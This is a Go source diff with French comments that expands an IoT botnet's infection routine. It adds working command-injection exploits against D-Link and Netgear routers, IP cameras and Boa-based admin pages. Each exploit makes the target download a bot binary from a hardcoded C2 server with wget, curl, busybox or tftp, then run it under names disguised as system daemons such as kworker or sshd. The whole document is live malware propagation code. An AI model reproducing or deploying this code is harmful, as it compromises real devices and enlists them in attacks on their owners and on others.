@@ -30,6 +30,69 @@ func zeroByte(a []byte) {
     }
 }
 
+// Exploiter la vulnérabilité RCE dans les routeurs D-Link
+func exploitDlinkRCE(target string, c2Server string, hideName string, malwarePath string) {
+	// Vulnérabilité d'exécution de commande dans les routeurs D-Link
+	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
+	if err != nil {
+		return
+	}
+
+	// Construire la commande d'exploitation
+	exploitCmd := fmt.Sprintf("command=wget http://%s%s -O /tmp/.%s && chmod 777 /tmp/.%s && /tmp/.%s mips &", 
+		c2Server, malwarePath, hideName, hideName, hideName)
+	
+	// Envoyer la requête pour exploiter la vulnérabilité
+	httpRequest := fmt.Sprintf("POST /apply.cgi HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s\r\n\r\n",
+		target, len(exploitCmd), exploitCmd)
+
+	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+	conn.Write([]byte(httpRequest))
+	conn.Close()
+}
+
+// Exploiter la vulnérabilité dans les routeurs Netgear
+func exploitNetgearRCE(target string, c2Server string, hideName string, malwarePath string) {
+	// Vulnérabilité d'exécution de commande dans les routeurs Netgear
+	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
+	if err != nil {
+		return
+	}
+
+	// Construire la commande d'exploitation
+	exploitCmd := fmt.Sprintf("wget http://%s%s -O /tmp/.%s && chmod 777 /tmp/.%s && /tmp/.%s mips &", 
+		c2Server, malwarePath, hideName, hideName, hideName)
+	
+	// Envoyer la requête pour exploiter la vulnérabilité
+	httpRequest := fmt.Sprintf("GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=%s&curpath=/&currentsetting.htm=1 HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
+		exploitCmd, target)
+
+	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+	conn.Write([]byte(httpRequest))
+	conn.Close()
+}
+
+// Exploiter la vulnérabilité dans les caméras IP
+func exploitIPCameraRCE(target string, c2Server string, hideName string, malwarePath string) {
+	// Vulnérabilité d'exécution de commande dans les caméras IP
+	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
+	if err != nil {
+		return
+	}
+
+	// Construire la commande d'exploitation
+	exploitCmd := fmt.Sprintf("wget http://%s%s -O /tmp/.%s && chmod 777 /tmp/.%s && /tmp/.%s mips &", 
+		c2Server, malwarePath, hideName, hideName, hideName)
+	
+	// Envoyer la requête pour exploiter la vulnérabilité
+	httpRequest := fmt.Sprintf("GET /system.ini?loginuse&loginpas&%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
+		exploitCmd, target)
+
+	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+	conn.Write([]byte(httpRequest))
+	conn.Close()
+}
+
 func sendExploit(target string) int {
 	// Liste des différents malwares à tester (tous hébergés sur votre serveur C2)
 	malwares := []struct {
@@ -37,110 +100,146 @@ func sendExploit(target string) int {
 		path string
 		arch string
 		args string // Arguments à passer au malware lors de l'exécution
+		priority int // Priorité d'infection (plus le chiffre est bas, plus la priorité est élevée)
 	}{
-		{"bot", "/bot.mips", "mips", "mips"},
-		{"bot", "/bot.arm", "arm", "arm"},
-		{"bot", "/bot.arm7", "arm7", "arm7"},
-		{"bot", "/bot.x86", "x86", "x86"},
-		{"bot", "/bot.x86_64", "x86_64", "x86_64"},
-		{"bot", "/bot.sh4", "sh4", "sh4"},
-		{"bot", "/bot.m68k", "m68k", "m68k"},
-		{"bot", "/bot.ppc", "ppc", "ppc"},
-		{"bot", "/bot.sparc", "sparc", "sparc"},
+		{"bot", "/bot.mips", "mips", "mips", 1},         // Très courant dans les routeurs
+		{"bot", "/bot.arm", "arm", "arm", 2},           // Courant dans les appareils IoT
+		{"bot", "/bot.arm7", "arm7", "arm7", 3},       // Appareils ARM modernes
+		{"bot", "/bot.x86", "x86", "x86", 4},           // Ordinateurs 32 bits
+		{"bot", "/bot.x86_64", "x86_64", "x86_64", 5}, // Ordinateurs 64 bits
+		{"bot", "/bot.sh4", "sh4", "sh4", 6},           // Appareils embarqués
+		{"bot", "/bot.m68k", "m68k", "m68k", 7},       // Anciens systèmes
+		{"bot", "/bot.ppc", "ppc", "ppc", 8},           // PowerPC
+		{"bot", "/bot.sparc", "sparc", "sparc", 9},     // Serveurs SPARC
 	}
+
+	// Noms alternatifs pour camoufler le malware
+	hideNames := []string{
+		"sysupdate",
+		"systemd-worker",
+		"kworker",
+		"crond",
+		"udevd",
+		"ntpd",
+		"sshd",
+		"dropbear",
+		"telnetd",
+	}
+
+	// Sélectionner un nom aléatoire pour se cacher
+	hideName := hideNames[rand.Intn(len(hideNames))]
 
 	// Serveur C2
 	c2Server := "51.68.128.169:1337"
-
-	// Essayer chaque malware
-	for _, malware := range malwares {
-		conn, err := net.DialTimeout("tcp", target, 30 * time.Second)
-		if err != nil {
-			continue
-		}
-
-		// Construire la commande d'exploitation avec wget
-		exploitCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20/var/tmp/%s%%3Bwget%%20http://%s%s%%20-O%%20->/var/tmp/%s%%3Bchmod%%20777%%20/var/tmp/%s%%3B/var/tmp/%s%%20%s", 
-			malware.name, c2Server, malware.path, malware.name, malware.name, malware.name, malware.args)
-		
-		// Envoyer la requête pour notre serveur C2
-		httpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
-			target, len(exploitCmd)+29, target, target, exploitCmd)
-
-		conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
-		conn.Write([]byte(httpRequest))
-		conn.SetReadDeadline(time.Now().Add(5 * time.Second))
-		bytebuf := make([]byte, 512)
-		conn.Read(bytebuf)
-		conn.Close()
-		
-		// Essayer aussi avec un autre chemin (/tmp au lieu de /var/tmp)
-		conn2, err := net.DialTimeout("tcp", target, 30 * time.Second)
-		if err != nil {
-			continue
-		}
-		
-		// Construire la commande d'exploitation avec un chemin alternatif
-		altPathCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20/tmp/%s%%3Bwget%%20http://%s%s%%20-O%%20->/tmp/%s%%3Bchmod%%20777%%20/tmp/%s%%3B/tmp/%s%%20%s", 
-			malware.name, c2Server, malware.path, malware.name, malware.name, malware.name, malware.args)
-
-		// Envoyer la requête avec le chemin alternatif
-		altHttpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
-			target, len(altPathCmd)+29, target, target, altPathCmd)
-
-		conn2.SetWriteDeadline(time.Now().Add(30 * time.Second))
-		conn2.Write([]byte(altHttpRequest))
-		conn2.SetReadDeadline(time.Now().Add(5 * time.Second))
-		bytebuf2 := make([]byte, 512)
-		conn2.Read(bytebuf2)
-		conn2.Close()
-
-		// Pause entre les tentatives
-		time.Sleep(500 * time.Millisecond)
+	
+	// Chemins d'installation alternatifs
+	installPaths := []string{
+		"/tmp",
+		"/var/tmp",
+		"/dev",
+		"/var/run",
+		"/var/lock",
+		"/bin",
+		"/usr/bin",
+		"/usr/local/bin",
 	}
 
-	// Essayer aussi avec curl au lieu de wget pour chaque malware
+	// Essayer chaque malware en fonction de sa priorité
+	// Trier les malwares par priorité (les plus prioritaires d'abord)
 	for _, malware := range malwares {
-		// Essayer avec curl dans /var/tmp
-		conn, err := net.DialTimeout("tcp", target, 30 * time.Second)
-		if err == nil {
-			exploitCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20/var/tmp/%s%%3Bcurl%%20http://%s%s%%20-o%%20/var/tmp/%s%%3Bchmod%%20777%%20/var/tmp/%s%%3B/var/tmp/%s%%20%s", 
-				malware.name, c2Server, malware.path, malware.name, malware.name, malware.name, malware.args)
+		// Sélectionner un nom aléatoire pour ce malware
+		hideName := hideNames[rand.Intn(len(hideNames))]
+		
+		// Essayer plusieurs chemins d'installation
+		for _, installPath := range installPaths {
+			conn, err := net.DialTimeout("tcp", target, 10 * time.Second) // Réduit à 10 secondes pour accélérer
+			if err != nil {
+				break // Si on ne peut pas se connecter, passer au malware suivant
+			}
+			
+			// Construire la commande d'exploitation avec wget et nom caché
+			exploitCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Bwget%%20http://%s%s%%20-O%%20%s/.%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20%s%%20&", 
+				installPath, hideName, c2Server, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
+			
+			// Envoyer la requête pour notre serveur C2
 			httpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
 				target, len(exploitCmd)+29, target, target, exploitCmd)
 
-			conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
+			conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
 			conn.Write([]byte(httpRequest))
-			conn.Close()
-			time.Sleep(300 * time.Millisecond)
+			conn.Close() // Fermer immédiatement pour accélérer
+			
+			// Essayer avec curl comme alternative à wget
+			conn2, err := net.DialTimeout("tcp", target, 10 * time.Second)
+			if err == nil {
+				curlCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Bcurl%%20http://%s%s%%20-o%%20%s/.%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20%s%%20&", 
+					installPath, hideName, c2Server, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
+				
+				curlRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
+					target, len(curlCmd)+29, target, target, curlCmd)
+
+				conn2.SetWriteDeadline(time.Now().Add(10 * time.Second))
+				conn2.Write([]byte(curlRequest))
+				conn2.Close()
+			}
+			
+			// Essayer avec busybox wget comme troisième option
+			conn3, err := net.DialTimeout("tcp", target, 10 * time.Second)
+			if err == nil {
+				busyboxCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Bbusybox%%20wget%%20http://%s%s%%20-O%%20%s/.%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20%s%%20&", 
+					installPath, hideName, c2Server, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
+				
+				busyboxRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
+					target, len(busyboxCmd)+29, target, target, busyboxCmd)
+
+				conn3.SetWriteDeadline(time.Now().Add(10 * time.Second))
+				conn3.Write([]byte(busyboxRequest))
+				conn3.Close()
+			}
 		}
 		
-		// Essayer avec curl dans /tmp
-		conn2, err := net.DialTimeout("tcp", target, 30 * time.Second)
-		if err == nil {
-			altExploitCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20/tmp/%s%%3Bcurl%%20http://%s%s%%20-o%%20/tmp/%s%%3Bchmod%%20777%%20/tmp/%s%%3B/tmp/%s%%20%s", 
-				malware.name, c2Server, malware.path, malware.name, malware.name, malware.name, malware.args)
-			altHttpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
-				target, len(altExploitCmd)+29, target, target, altExploitCmd)
+		// Pause très courte entre les tentatives
+		time.Sleep(100 * time.Millisecond)
+	}
 
-			conn2.SetWriteDeadline(time.Now().Add(30 * time.Second))
-			conn2.Write([]byte(altHttpRequest))
-			conn2.Close()
-			time.Sleep(300 * time.Millisecond)
+	// Exploiter d'autres vulnérabilités connues dans différents appareils
+	// 1. Exploiter la vulnérabilité RCE dans les routeurs D-Link
+	exploitDlinkRCE(target, c2Server, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
+	
+	// 2. Exploiter la vulnérabilité dans les routeurs Netgear
+	exploitNetgearRCE(target, c2Server, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
+	
+	// 3. Exploiter la vulnérabilité dans les caméras IP
+	exploitIPCameraRCE(target, c2Server, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
+	
+	// 4. Essayer aussi avec tftp comme méthode alternative de téléchargement
+	for _, installPath := range installPaths[:3] { // Limiter aux 3 premiers chemins pour économiser du temps
+		hideName := hideNames[rand.Intn(len(hideNames))]
+		conn3, err := net.DialTimeout("tcp", target, 10 * time.Second)
+		if err == nil {
+			tftpCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Btftp%%20-g%%20-r%%20bot.mips%%20%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20mips%%20&", 
+				installPath, hideName, c2Server, installPath, hideName, installPath, hideName)
+			tftpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
+				target, len(tftpCmd)+29, target, target, tftpCmd)
+
+			conn3.SetWriteDeadline(time.Now().Add(10 * time.Second))
+			conn3.Write([]byte(tftpRequest))
+			conn3.Close()
 		}
 	}
 	
-	// Essayer aussi avec tftp comme méthode alternative de téléchargement
-	conn3, err := net.DialTimeout("tcp", target, 30 * time.Second)
+	// 5. Essayer avec une injection de commande dans le paramètre ping
+	conn4, err := net.DialTimeout("tcp", target, 10 * time.Second)
 	if err == nil {
-		tftpCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20/var/tmp/bot%%3Btftp%%20-g%%20-r%%20bot.mips%%20%s%%3Bchmod%%20777%%20/var/tmp/bot%%3B/var/tmp/bot%%20mips", 
-			c2Server)
-		tftpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
-			target, len(tftpCmd)+29, target, target, tftpCmd)
+		hideName := hideNames[rand.Intn(len(hideNames))]
+		pingCmd := fmt.Sprintf("ping_addr=127.0.0.1;wget%%20http://%s/bot.mips%%20-O%%20/tmp/.%s;chmod%%20777%%20/tmp/.%s;/tmp/.%s%%20mips%%20&", 
+			c2Server, hideName, hideName, hideName)
+		pingRequest := fmt.Sprintf("POST /boaform/admin/formPing HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_ping_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s\r\n\r\n",
+			target, len(pingCmd), target, target, pingCmd)
 
-		conn3.SetWriteDeadline(time.Now().Add(30 * time.Second))
-		conn3.Write([]byte(tftpRequest))
-		conn3.Close()
+		conn4.SetWriteDeadline(time.Now().Add(10 * time.Second))
+		conn4.Write([]byte(pingRequest))
+		conn4.Close()
 	}
 
 	return 1
